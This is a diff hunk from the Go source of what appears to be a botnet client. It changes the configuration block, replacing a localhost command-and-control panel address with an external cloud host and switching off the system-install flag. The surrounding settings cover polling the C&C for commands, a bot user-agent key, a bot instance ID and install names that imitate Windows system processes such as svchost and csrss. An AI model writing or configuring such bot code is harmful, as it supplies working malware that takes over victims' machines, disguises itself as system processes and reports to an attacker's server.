@@ -17,15 +17,15 @@ var (
 	//============================================================
 	//                   Basic Variables
 	//============================================================
-	httpPanels            = [...]string{"http://127.0.0.1:9990/"}  //HTTP C&C Addresses
-	useSSL                = false                                  //Use SSL Connections? Make sure the Panel URLS are https://
-	sslInsecureSkipVerify = true                                   //Use Insecure SSL Certs? AKA Self-signed (Not Recomended)
-	userAgentKey          = "d5900619da0c8a72e569e88027cd9490"     //Useragent for the panel to check to see if its a bot, change me to the one in the servers settings
-	checkEveryMin         = 15                                     //Min Time (Seconds) to check for commands
-	checkEveryMax         = 25                                     //Max Time (Seconds) to check for commands (Must be more then Min)
-	instanceKey           = "80202e73-067f-4b4c-93f8-d738d1f77f69" //Bots Uniqe ID, Generate here; https://www.guidgen.com/
-	installMe             = true                                   //Should the bot install into system?
-	installNames          = [...]string{                           //Names for the Bot
+	httpPanels            = [...]string{"https://server4325-mshoaei.fandogh.cloud/"} //HTTP C&C Addresses
+	useSSL                = false                                                    //Use SSL Connections? Make sure the Panel URLS are https://
+	sslInsecureSkipVerify = true                                                     //Use Insecure SSL Certs? AKA Self-signed (Not Recomended)
+	userAgentKey          = "d5900619da0c8a72e569e88027cd9490"                       //Useragent for the panel to check to see if its a bot, change me to the one in the servers settings
+	checkEveryMin         = 15                                                       //Min Time (Seconds) to check for commands
+	checkEveryMax         = 25                                                       //Max Time (Seconds) to check for commands (Must be more then Min)
+	instanceKey           = "80202e73-067f-4b4c-93f8-d738d1f77f69"                   //Bots Uniqe ID, Generate here; https://www.guidgen.com/
+	installMe             = false                                                    //Should the bot install into system?
+	installNames          = [...]string{                                             //Names for the Bot
 		// "svchost",
 		// "csrss",
 		// "rundll32",
